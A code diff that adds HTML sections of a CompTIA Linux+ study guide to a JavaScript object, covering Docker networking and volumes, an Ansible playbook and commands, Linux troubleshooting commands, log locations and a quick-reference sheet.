+# COPY requirements.txt .
+# RUN pip3 install -r requirements.txt
+# COPY . .
+# EXPOSE 8080
+# CMD ["python3", "app.py"]
+
+# Networks
+docker network ls
+docker network create mynet
+docker run -d --network mynet --name db postgres
+docker run -d --network mynet --name app myapp
+
+# Volumes (persistent storage)
+docker volume create mydata
+docker run -d -v mydata:/data nginx
+docker volume ls
+docker volume inspect mydata
+</code></pre>
+<h3>Ansible Basics</h3>
+<pre><code># Inventory file (hosts.ini)
+[webservers]
+web1.example.com
+web2.example.com
+
+[databases]
+db1.example.com ansible_user=admin ansible_ssh_private_key_file=~/.ssh/key
+
+# Playbook (deploy.yml)
+---
+- name: Configure web servers
+  hosts: webservers
+  become: yes                   # Use sudo
+
+  vars:
+    app_port: 8080
+    app_dir: /opt/myapp
+
+  tasks:
+    - name: Update apt cache
+      apt:
+        update_cache: yes
+
+    - name: Install nginx
+      package:
+        name: nginx
+        state: present
+
+    - name: Copy config
+      template:
+        src: nginx.conf.j2
+        dest: /etc/nginx/nginx.conf
+      notify: restart nginx
+
+    - name: Ensure nginx is running
+      service:
+        name: nginx
+        state: started
+        enabled: yes
+
+  handlers:
+    - name: restart nginx
+      service:
+        name: nginx
+        state: restarted
+</code></pre>
+<pre><code># Ansible commands
+ansible all -i hosts.ini -m ping                # Test connectivity
+ansible webservers -i hosts.ini -m shell -a "uptime"  # Run command
+ansible-playbook deploy.yml -i hosts.ini        # Run playbook
+ansible-playbook deploy.yml --check             # Dry run
+ansible-playbook deploy.yml -v                  # Verbose
+ansible-vault encrypt secrets.yml              # Encrypt file
+ansible-vault edit secrets.yml
+</code></pre>
+
+`,
+  "study-guide-linuxplus-15": `
+<h2>15. Linux+ Troubleshooting Commands</h2>
+<pre><code># System info
+uname -a                        # Kernel version and arch
+hostnamectl                     # Hostname and OS info
+lscpu                           # CPU info
+lsmem                           # Memory info
+lsblk                           # Block devices
+lspci                           # PCI devices
+lsusb                           # USB devices
+dmidecode                       # Hardware info from BIOS
+
+# Performance
+top, htop                       # Real-time processes
+uptime                          # Load averages
+vmstat 1 5                      # Virtual memory stats
+iostat -x 1                     # I/O stats
+sar -u 1 5                      # CPU usage over time
+free -h                         # Memory usage
+
+# Boot process
+dmesg                           # Kernel ring buffer (boot messages)
+dmesg | grep -i error
+journalctl -b                   # This boot's logs
+journalctl -b -1                # Previous boot
+systemctl list-units --failed   # Failed services
+
+# Log files
+/var/log/syslog                 # General system log (Debian)
+/var/log/messages               # General system log (RHEL)
+/var/log/auth.log               # Authentication log (Debian)
+/var/log/secure                 # Authentication log (RHEL)
+/var/log/kern.log               # Kernel log
+/var/log/dmesg                  # Boot messages
+/var/log/nginx/access.log       # Nginx access
+/var/log/nginx/error.log        # Nginx errors
+/var/log/mysql/error.log        # MySQL errors
+</code></pre>
+
+`,
+  "study-guide-linuxplus-16": `
+<h2>16. Linux+ Quick Reference</h2>
+<p><strong>File permissions:</strong> rwx rwx rwx = owner group others; r=4 w=2 x=1<br/><strong>SUID:</strong> Executes as file owner | <strong>SGID:</strong> Executes as file group | <strong>Sticky:</strong> Only owner deletes<br/><strong>Find SUID:</strong> <code>find / -perm -4000</code><br/><strong>Package managers:</strong> apt/dpkg (Debian) | dnf/rpm (RHEL)<br/><strong>Process signals:</strong> 1=SIGHUP 2=SIGINT 9=SIGKILL 15=SIGTERM<br/><strong>Systemd:</strong> <code>systemctl start|stop|restart|enable|disable|status service</code><br/><strong>Journal:</strong> <code>journalctl -u service -f</code><br/><strong>LVM:</strong> PV → VG → LV<br/><strong>SELinux:</strong> Enforcing &gt; Permissive &gt; Disabled; <code>getenforce</code> / <code>setenforce</code><br/><strong>SSH keys:</strong> <code>ssh-keygen</code> → <code>ssh-copy-id</code> → connect<br/><strong>Bash special vars:</strong> <code>$0</code>=script <code>$1-9</code>=args <code>$#</code>=count <code>$?</code>=exit code <code>$$</code>=PID<br/><strong>Networking:</strong> <code>ip addr</code> / <code>ip route</code> / <code>ss -tulnp</code><br/><strong>Redirection:</strong> <code>&gt;</code> overwrite | <code>&gt;&gt;</code> append | <code>2&gt;</code> stderr | <code>|</code> pipe</p>
+
+<p><em>End of CompTIA Linux+ Study Guide</em></p>
+
 `
+
 };
